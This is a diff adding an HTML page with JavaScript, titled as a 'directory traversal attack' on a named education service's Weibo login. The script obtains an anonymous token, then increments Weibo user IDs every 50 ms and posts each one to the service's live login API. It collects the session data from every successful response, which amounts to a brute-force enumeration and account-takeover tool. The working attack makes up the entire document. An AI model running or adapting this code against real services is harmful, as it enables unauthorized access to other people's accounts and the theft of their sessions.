@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+
+    <style>
+        #travelResult {
+            display: none;
+        }
+
+        .memo {
+            margin: 30px 0px 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <h4>Directory Traversal Attack: weiboLogin</h4>
+
+    <button onclick="createAnonymous()">CreateAnonymous</button>
+    <p id="createAnonymousResult"></p>
+
+    <div class="memo">
+        <a href="http://api.dev.qingshuxuetang.com/doc/#api-Account-Login" target="_blank" rel="noopener noreferrer">
+            <span>target api </span>
+        </a>
+    </div>
+
+    <button onclick="travelLogin()">Start Travel</button>
+    <button onclick="stopTravel()">Stop Travel</button>
+
+    <div id="travelResult">
+        <h5>Traveling: <span id="count"></span></h5>
+        <ul id="result" />
+    </div>
+
+    <script>
+        const anonymous_api = "http://api.ppe.qingshuxuetang.com/v6_1/account/createAnonymous";
+        const login_api = "http://api.ppe.qingshuxuetang.com/v6_1/account/login";
+        const $resultUL = document.getElementById("result");
+        const $count = document.getElementById("count");
+
+        let anonymousToken = "";
+        let weiboUserId = 2373113150;
+        let interval = null;
+
+        function createAnonymous() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", anonymous_api);
+            xhr.setRequestHeader("Content-type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("createAnonymousResult").innerText = xhr.responseText;
+
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0) {
+                        anonymousToken = response.data;
+                    }
+                }
+            };
+
+            let requestBody = {
+                "clientType": 1,
+                "deviceToken": "6AD57A14-7C5B-4C9E-BC46-5CB5168FE5B8"
+            };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+        function travelLogin() {
+            document.getElementById("travelResult").style.display = "block";
+
+            interval = setInterval(function () {
+                login(weiboUserId);
+                $count.innerText = weiboUserId;
+                weiboUserId++;
+
+                if (weiboUserId > 9999999999) { // if 1000/s => 11Day
+                    clearInterval(interval);
+                }
+            }, 50);
+        }
+
+        function stopTravel() {
+            clearInterval(interval);
+        }
+
+        function login(weiboUserId) {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", login_api, false)
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.setRequestHeader("User-Agent-QS", "QSXT");
+            xhr.setRequestHeader("Authorization-QS", anonymousToken);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0) {
+                        $resultUL.innerHTML += "<li><span style='font-style: italic;'>" + weiboUserId + " :  </span><span>" + response.data + "</span</li>"
+                    }
+                }
+            };
+
+            let requestBody = { type: 3, ssnToken: weiboUserId, ssnType: 1 };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+    </script>
+</body>
+
+</html>
